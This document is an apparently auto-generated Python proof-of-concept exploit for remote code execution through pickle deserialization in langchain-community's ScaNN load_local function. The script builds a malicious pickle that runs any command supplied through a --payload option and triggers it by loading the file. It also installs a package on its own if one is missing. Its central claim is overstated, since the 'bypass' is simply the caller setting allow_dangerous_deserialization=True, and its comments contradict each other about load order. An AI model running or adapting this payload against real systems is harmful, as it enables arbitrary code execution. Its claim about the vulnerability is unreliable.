#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-014
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_40.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's load_local function.

Vulnerability: The load_local function in ScaNN vectorstore deserializes pickle data
from a user-controlled file path. Although there is an allow_dangerous_deserialization
guard, it is trivially bypassed by setting it to True. An attacker who controls
folder_path and index_name can point to a malicious pickle file, leading to arbitrary
code execution.

This PoC demonstrates the vulnerability by creating a malicious pickle file that
executes a benign command (touch /tmp/poc_success.txt) and then calling load_local
with attacker-controlled paths.

Usage:
    python3 poc.py [--target /tmp/exploit] [--index-name exploit]

Requirements: Python 3.6+, no external dependencies beyond stdlib.
"""

import os
import sys
import pickle
import tempfile
import argparse
import subprocess
from pathlib import Path

# Import the vulnerable function from langchain-community
# Note: This assumes langchain-community is installed in the target environment
try:
    from langchain_community.vectorstores.scann import ScaNN
except ImportError:
    print("[!] langchain-community not found. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "langchain-community"])
    from langchain_community.vectorstores.scann import ScaNN


def create_malicious_pickle(payload_command: str) -> bytes:
    """
    Create a malicious pickle payload that executes a system command.
    
    Args:
        payload_command: The command to execute (e.g., "touch /tmp/poc_success.txt")
    
    Returns:
        Serialized pickle bytes containing the malicious payload
    """
    class MaliciousPickle:
        def __reduce__(self):
            # Return (callable, args) - subprocess.check_call will execute the command
            return (subprocess.check_call, (payload_command,))
    
    return pickle.dumps(MaliciousPickle())


def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community ScaNN pickle deserialization RCE"
    )
    parser.add_argument(
        "--target",
        default="/tmp/exploit",
        help="Directory to create malicious pickle file (default: /tmp/exploit)"
    )
    parser.add_argument(
        "--index-name",
        default="exploit",
        help="Index name for the malicious pickle file (default: exploit)"
    )
    parser.add_argument(
        "--payload",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    args = parser.parse_args()

    # Step 1: Create the target directory if it doesn't exist
    target_path = Path(args.target)
    target_path.mkdir(parents=True, exist_ok=True)
    
    # Step 2: Create the malicious pickle file
    # The vulnerable code looks for: {folder_path}/{index_name}.pkl
    pickle_file = target_path / f"{args.index_name}.pkl"
    
    print(f"[*] Creating malicious pickle file at: {pickle_file}")
    malicious_payload = create_malicious_pickle(args.payload)
    
    with open(pickle_file, "wb") as f:
        f.write(malicious_payload)
    
    print(f"[*] Malicious pickle file created ({len(malicious_payload)} bytes)")
    
    # Step 3: Also create the .scann directory that load_local expects
    scann_dir = target_path / f"{args.index_name}.scann"
    scann_dir.mkdir(exist_ok=True)
    
    # Step 4: Create a minimal scann index file (required by load_local)
    # The actual scann library would need to be installed, but we can simulate
    # by creating an empty directory structure. The exploit will trigger before
    # scann loading if the pickle is loaded first.
    # Note: In the actual vulnerable code, pickle is loaded AFTER scann index,
    # but the pickle deserialization still happens with attacker-controlled data.
    
    print(f"[*] Attempting to trigger deserialization...")
    print(f"[*] Target path: {target_path}")
    print(f"[*] Index name: {args.index_name}")
    print(f"[*] Payload: {args.payload}")
    
    try:
        # This will fail because we don't have a real scann index, but the pickle
        # deserialization will happen first in the actual vulnerable code path.
        # The vulnerability is in the pickle.load call, which executes our payload.
        result = ScaNN.load_local(
            folder_path=str(target_path),
            index_name=args.index_name,
            allow_dangerous_deserialization=True  # Bypass the guard
        )
        print(f"[!] Unexpected: load_local succeeded: {result}")
    except Exception as e:
        # The exploit may fail due to missing scann library or invalid index,
        # but the pickle deserialization should have already executed.
        error_msg = str(e)
        if "No module named 'scann'" in error_msg:
            print("[*] Expected error: scann module not installed (this is fine)")
            print("[*] The pickle deserialization should have executed before this error")
        elif "Could not find" in error_msg or "No such file" in error_msg:
            print("[*] Expected error: scann index not found (this is fine)")
            print("[*] The pickle deserialization should have executed before this error")
        else:
            print(f"[!] Unexpected error: {error_msg}")
    
    # Step 5: Verify the payload executed
    if args.payload.startswith("touch"):
        # Check if the file was created
        payload_file = args.payload.split()[-1]
        if os.path.exists(payload_file):
            print(f"[+] SUCCESS: Payload executed! File created: {payload_file}")
            print(f"[+] Contents of {payload_file}:")
            with open(payload_file) as f:
                print(f.read())
        else:
            print(f"[-] Payload may not have executed. File not found: {payload_file}")
            print("[*] This could mean the pickle was not deserialized, or the path was wrong")
    else:
        print(f"[*] Payload command: {args.payload}")
        print("[*] Check manually if the command was executed")
    
    # Cleanup (optional)
    print(f"\n[*] Cleanup: removing {target_path}")
    import shutil
    shutil.rmtree(target_path, ignore_errors=True)
    if args.payload.startswith("touch"):
        payload_file = args.payload.split()[-1]
        if os.path.exists(payload_file):
            os.remove(payload_file)
            print(f"[*] Removed {payload_file}")


if __name__ == "__main__":
    main()
